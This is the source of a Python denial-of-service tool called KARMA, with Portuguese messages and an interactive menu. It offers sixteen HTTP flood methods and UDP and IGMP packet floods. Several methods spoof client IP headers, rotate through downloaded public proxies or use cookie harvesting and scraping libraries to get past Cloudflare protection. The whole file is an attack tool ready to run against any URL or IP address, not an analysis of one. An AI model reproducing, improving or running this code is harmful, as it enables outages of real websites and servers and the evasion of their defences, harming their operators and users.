#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# karma fixed build — kali
# pip install requests cloudscraper pysocks httpx colorama curl_cffi

import os, threading, requests, sys, cloudscraper, datetime, time
import socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from curl_cffi import requests as cffi_requests
from sys import stdout
from colorama import Fore, init

init(autoreset=True)

proxies = []
cookieJAR = None
cookie = ""
useragent = ""
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    clear()
    print(f"""{Fore.MAGENTA}
               ██╗  ██╗ █████╗ ██████╗ ███╗   ███╗ █████╗ 
               ██║ ██╔╝██╔══██╗██╔══██╗████╗ ████║██╔══██╗
               █████╔╝ ███████║██████╔╝██╔████╔██║███████║
               ██╔═██╗ ██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║
               ██║  ██╗██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║
               ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
{Fore.WHITE}
                    {Fore.LIGHTCYAN_EX}KARMA {Fore.WHITE}— {Fore.LIGHTWHITE_EX}fixed build
                    {Fore.LIGHTBLACK_EX}by HyukIsBack {Fore.WHITE}| {Fore.LIGHTBLACK_EX}refactored for Kali
{Fore.WHITE}""")


def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        left = (until - datetime.datetime.now()).total_seconds()
        if left > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack status => {left:.0f} sec left ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack Done !                                   \n")
            return


def get_target(url):
    url = url.rstrip()
    p = urlparse(url)
    t = {"uri": p.path or "/", "host": p.netloc, "scheme": p.scheme or "https"}
    t["port"] = p.port or ("443" if t["scheme"] == "https" else "80")
    return t


def get_proxylist(ptype):
    global proxies
    if ptype == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all", timeout=10).text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=10).text
    else:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all", timeout=10).text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=10).text
    proxies = [x.strip() for x in r.splitlines() if x.strip()]
    os.makedirs("./resources", exist_ok=True)
    open(f"./resources/{ptype.lower()}.txt", "w").write("\n".join(proxies))
    print(f" {Fore.MAGENTA}[*]{Fore.WHITE} {len(proxies)} proxies salvos.")


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        print(f" {Fore.RED}cadê ./proxy.txt?{Fore.WHITE}")
        return
    proxies = [x.strip() for x in open("./proxy.txt").read().splitlines() if x.strip()]
    print(f" {Fore.MAGENTA}[*]{Fore.WHITE} {len(proxies)} proxies carregados.")


def get_cookie(url):
    global useragent, cookieJAR, cookie
    try:
        sess = cffi_requests.Session(impersonate="chrome120")
        sess.get(url, timeout=15, verify=False)
        for c in sess.cookies.jar:
            if c.name == "cf_clearance":
                cookieJAR = {"name": c.name, "value": c.value}
                cookie = f"{c.name}={c.value}"
                useragent = sess.headers.get("User-Agent", random.choice(ua))
                return True
    except Exception:
        pass
    return False


def spoof(target):
    ip = ".".join(
        str(random.randrange(11, 197)) if i == 0 else
        str(random.randrange(0, 255)) if i < 3 else
        str(random.randrange(2, 254)) for i in range(4)
    )
    return (
        f"X-Forwarded-Proto: Http\r\nX-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {ip}\r\nClient-IP: {ip}\r\nX-Forwarded-For: {ip}\r\nReal-IP: {ip}\r\n"
    )


def get_info_l7():
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}URL      {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    target = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}THREAD   {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    th = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}TIME(s)  {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    t = input()
    return target, th, t


def get_info_l4():
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}IP       {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    host = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}PORT     {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    port = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}THREAD   {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    th = input()
    stdout.write(f"\x1b[38;2;255;20;147m • {Fore.WHITE}TIME(s)  {Fore.LIGHTCYAN_EX}: {Fore.LIGHTGREEN_EX}")
    t = input()
    return host, port, th, t


# ---------- Layer 4 ----------
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        threading.Thread(target=flooder, args=(host, port, rand, until), daemon=True).start()


def flooder(host, port, rand, until):
    try:
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    except Exception:
        return
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except Exception:
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=sender, args=(host, port, until, payload), daemon=True).start()


def sender(host, port, until, payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception:
        return
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except Exception:
            pass


# ---------- Layer 7 ----------
def AttackHEAD(url, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=10, headers={"User-Agent": random.choice(ua)})
        except Exception:
            pass


def AttackPOST(url, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=10, headers={"User-Agent": random.choice(ua)})
        except Exception:
            pass


def AttackRAW(url, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=10, headers={"User-Agent": random.choice(ua)})
        except Exception:
            pass


def AttackPXRAW(url, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        proxy = "http://" + str(random.choice(proxies))
        try:
            requests.get(url, timeout=10, proxies={"http": proxy, "https": proxy})
        except Exception:
            pass


def AttackPXSOC(target, until, req):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(proxies).split(":")
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackSOC(target, until, req):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackPPS(target, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
        except Exception:
            pass


def AttackNULL(target, until, req):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackSPOOF(target, until, req):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackPXSPOOF(target, until, req, proxy):
    try:
        p = proxy.split(":")
    except Exception:
        return
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(p[0]), int(p[1]))
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(100):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackCFB(url, until, scraper):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except Exception:
            pass


def AttackPXCFB(url, until, scraper):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                "http": "http://" + str(random.choice(proxies)),
                "https": "http://" + str(random.choice(proxies)),
            }
            scraper.get(url, timeout=15, proxies=proxy)
        except Exception:
            pass


def AttackCFPRO(url, until, scraper):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
    }
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15, headers=headers, allow_redirects=False)
        except Exception:
            pass


def AttackCFSOC(target, until, req):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target["host"]), int(target["port"])))
            if target["scheme"] == "https":
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target["host"])
            for _ in range(10):
                s.send(str.encode(req))
            s.close()
        except Exception:
            pass


def AttackHTTP2(url, until):
    client = httpx.Client(http2=True, timeout=10)
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers={"User-Agent": random.choice(ua)})
        except Exception:
            pass
    client.close()


def AttackPXHTTP2(url, until):
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(http2=True, timeout=10, proxy=f"http://{random.choice(proxies)}")
            client.get(url, headers={"User-Agent": random.choice(ua)})
            client.close()
        except Exception:
            pass


# ---------- dispatch ----------
METHODS = {
    "head": (AttackHEAD, "u"),
    "post": (AttackPOST, "u"),
    "raw": (AttackRAW, "u"),
    "pxraw": (AttackPXRAW, "u"),
    "pxsoc": (AttackPXSOC, "t"),
    "soc": (AttackSOC, "t"),
    "pps": (AttackPPS, "t"),
    "null": (AttackNULL, "t"),
    "spoof": (AttackSPOOF, "t"),
    "pxspoof": (AttackPXSPOOF, "p"),
    "cfb": (AttackCFB, "c"),
    "pxcfb": (AttackPXCFB, "c"),
    "cfpro": (AttackCFPRO, "c"),
    "cfsoc": (AttackCFSOC, "t"),
    "http2": (AttackHTTP2, "u"),
    "pxhttp2": (AttackPXHTTP2, "u"),
}


def launch(method, url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    fn, kind = METHODS[method]

    if kind == "c":
        scraper = cloudscraper.create_scraper()
        args = (url, until, scraper)
    elif kind == "t":
        req = (
            f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n"
            f"User-Agent: {random.choice(ua)}\r\nConnection: Keep-Alive\r\n"
        )
        if method in ("spoof", "null"):
            req += spoof(target)
        req += "\r\n"
        args = (target, until, req)
    elif kind == "u":
        args = (url, until)
    else:
        args = None

    for _ in range(int(th)):
        try:
            if method == "pxspoof":
                proxy = random.choice(proxies)
                threading.Thread(target=fn, args=(target, until, req, proxy), daemon=True).start()
            else:
                threading.Thread(target=fn, args=args, daemon=True).start()
        except Exception:
            pass


# ---------- menus ----------
def menu_l7():
    banner()
    print(f"""{Fore.LIGHTWHITE_EX}  ┌─ LAYER 7 ─────────────────────────────────────────┐
{Fore.WHITE}
    {Fore.LIGHTCYAN_EX}[01]{Fore.WHITE} HEAD           {Fore.LIGHTBLACK_EX}(simple head flood)
    {Fore.LIGHTCYAN_EX}[02]{Fore.WHITE} POST           {Fore.LIGHTBLACK_EX}(simple post flood)
    {Fore.LIGHTCYAN_EX}[03]{Fore.WHITE} RAW            {Fore.LIGHTBLACK_EX}(simple get flood)
    {Fore.LIGHTCYAN_EX}[04]{Fore.WHITE} PXRAW          {Fore.LIGHTBLACK_EX}(proxy get flood)
    {Fore.LIGHTCYAN_EX}[05]{Fore.WHITE} PXSOC          {Fore.LIGHTBLACK_EX}(proxy http raw socket)
    {Fore.LIGHTCYAN_EX}[06]{Fore.WHITE} SOC            {Fore.LIGHTBLACK_EX}(http raw socket)
    {Fore.LIGHTCYAN_EX}[07]{Fore.WHITE} PPS            {Fore.LIGHTBLACK_EX}(raw packet stream)
    {Fore.LIGHTCYAN_EX}[08]{Fore.WHITE} NULL           {Fore.LIGHTBLACK_EX}(null headers raw)
    {Fore.LIGHTCYAN_EX}[09]{Fore.WHITE} SPOOF          {Fore.LIGHTBLACK_EX}(spoofed headers raw)
    {Fore.LIGHTCYAN_EX}[10]{Fore.WHITE} PXSPOOF        {Fore.LIGHTBLACK_EX}(proxy spoof raw)
    {Fore.LIGHTCYAN_EX}[11]{Fore.WHITE} CFB            {Fore.LIGHTBLACK_EX}(cloudflare bypass)
    {Fore.LIGHTCYAN_EX}[12]{Fore.WHITE} PXCFB          {Fore.LIGHTBLACK_EX}(proxy cloudflare bypass)
    {Fore.LIGHTCYAN_EX}[13]{Fore.WHITE} CFPRO          {Fore.LIGHTBLACK_EX}(cloudflare pro)
    {Fore.LIGHTCYAN_EX}[14]{Fore.WHITE} CFSOC          {Fore.LIGHTBLACK_EX}(cloudflare socket)
    {Fore.LIGHTCYAN_EX}[15]{Fore.WHITE} HTTP2          {Fore.LIGHTBLACK_EX}(http/2 flood)
    {Fore.LIGHTCYAN_EX}[16]{Fore.WHITE} PXHTTP2        {Fore.LIGHTBLACK_EX}(proxy http/2)
{Fore.WHITE}
{Fore.LIGHTWHITE_EX}  └───────────────────────────────────────────────────┘{Fore.WHITE}""")


def menu_l4():
    banner()
    print(f"""{Fore.LIGHTWHITE_EX}  ┌─ LAYER 4 ─────────────────────────────────────────┐
{Fore.WHITE}
    {Fore.LIGHTCYAN_EX}[01]{Fore.WHITE} IGMP           {Fore.LIGHTBLACK_EX}(igmp flood)
    {Fore.LIGHTCYAN_EX}[02]{Fore.WHITE} UDP            {Fore.LIGHTBLACK_EX}(udp flood)
{Fore.WHITE}
{Fore.LIGHTWHITE_EX}  └───────────────────────────────────────────────────┘{Fore.WHITE}""")


def help_menu():
    banner()
    print(f"""{Fore.LIGHTWHITE_EX}  ┌─ COMMANDS ────────────────────────────────────────┐
{Fore.WHITE}
    {Fore.LIGHTCYAN_EX}l7{Fore.WHITE}             {Fore.LIGHTBLACK_EX}(layer 7 menu)
    {Fore.LIGHTCYAN_EX}l4{Fore.WHITE}             {Fore.LIGHTBLACK_EX}(layer 4 menu)
    {Fore.LIGHTCYAN_EX}proxy{Fore.WHITE}          {Fore.LIGHTBLACK_EX}(load ./proxy.txt)
    {Fore.LIGHTCYAN_EX}proxylist{Fore.WHITE}      {Fore.LIGHTBLACK_EX}(download fresh proxies)
    {Fore.LIGHTCYAN_EX}help{Fore.WHITE}           {Fore.LIGHTBLACK_EX}(this menu)
    {Fore.LIGHTCYAN_EX}clear{Fore.WHITE}          {Fore.LIGHTBLACK_EX}(clean screen)
    {Fore.LIGHTCYAN_EX}exit{Fore.WHITE}           {Fore.LIGHTBLACK_EX}(quit)
{Fore.WHITE}
{Fore.LIGHTWHITE_EX}  └───────────────────────────────────────────────────┘{Fore.WHITE}""")


L7_MAP = {
    "01": "head", "02": "post", "03": "raw", "04": "pxraw",
    "05": "pxsoc", "06": "soc", "07": "pps", "08": "null",
    "09": "spoof", "10": "pxspoof", "11": "cfb", "12": "pxcfb",
    "13": "cfpro", "14": "cfsoc", "15": "http2", "16": "pxhttp2",
}
L4_MAP = {"01": "igmp", "02": "udp"}


def main():
    banner()
    state = "main"
    while True:
        try:
            if state == "main":
                prompt = f"{Fore.LIGHTCYAN_EX}karma {Fore.MAGENTA}»{Fore.WHITE} "
            elif state == "l7":
                prompt = f"{Fore.LIGHTCYAN_EX}l7 {Fore.MAGENTA}»{Fore.WHITE} "
            else:
                prompt = f"{Fore.LIGHTCYAN_EX}l4 {Fore.MAGENTA}»{Fore.WHITE} "
            cmd = input(prompt).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if cmd in ("exit", "quit"):
            break

        if state == "l7":
            if cmd in ("back", ""):
                state = "main"; banner(); continue
            if cmd in L7_MAP:
                method = L7_MAP[cmd]
            elif cmd in METHODS:
                method = cmd
            else:
                print(f" {Fore.RED}opção inválida.{Fore.WHITE}"); continue
            state = "main"
            url, th, t = get_info_l7()
            threading.Thread(target=countdown, args=(t,), daemon=True).start()
            launch(method, url, th, t)
            continue
          
        if state == "l4":
            if cmd in ("back", ""):
                state = "main"; banner(); continue
            if cmd not in L4_MAP:
                print(f" {Fore.RED}opção inválida.{Fore.WHITE}"); continue
            state = "main"
            method = L4_MAP[cmd]
            host, port, th, t = get_info_l4()
            threading.Thread(target=countdown, args=(t,), daemon=True).start()
            if method == "igmp":
                runflooder(host, port, th, t)
            else:
                payload = input(f" {Fore.WHITE}payload (enter = random): ")
                runsender(host, port, th, t, payload)
            continue

        if cmd == "help":
            help_menu(); continue
        elif cmd == "clear":
            banner(); continue
        elif cmd == "l7":
            menu_l7(); state = "l7"; continue
        elif cmd == "l4":
            menu_l4(); state = "l4"; continue
        elif cmd == "proxy":
            get_proxies(); continue
        elif cmd == "proxylist":
            ptype = input(f" {Fore.WHITE}type (HTTP/SOCKS5): ").strip().upper()
            get_proxylist(ptype); continue
        elif cmd in METHODS:
            url, th, t = get_info_l7()
            threading.Thread(target=countdown, args=(t,), daemon=True).start()
            launch(cmd, url, th, t)
            continue
        elif cmd == "igmp":
            host, port, th, t = get_info_l4()
            threading.Thread(target=countdown, args=(t,), daemon=True).start()
            runflooder(host, port, th, t)
            continue
        elif cmd == "udp":
            host, port, th, t = get_info_l4()
            payload = input(f" {Fore.WHITE}payload (enter = random): ")
            threading.Thread(target=countdown, args=(t,), daemon=True).start()
            runsender(host, port, th, t, payload)
            continue

        print(f" {Fore.RED}unknown. type 'help'{Fore.WHITE}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n {Fore.MAGENTA}[*]{Fore.WHITE} saindo.")
        sys.exit(0)
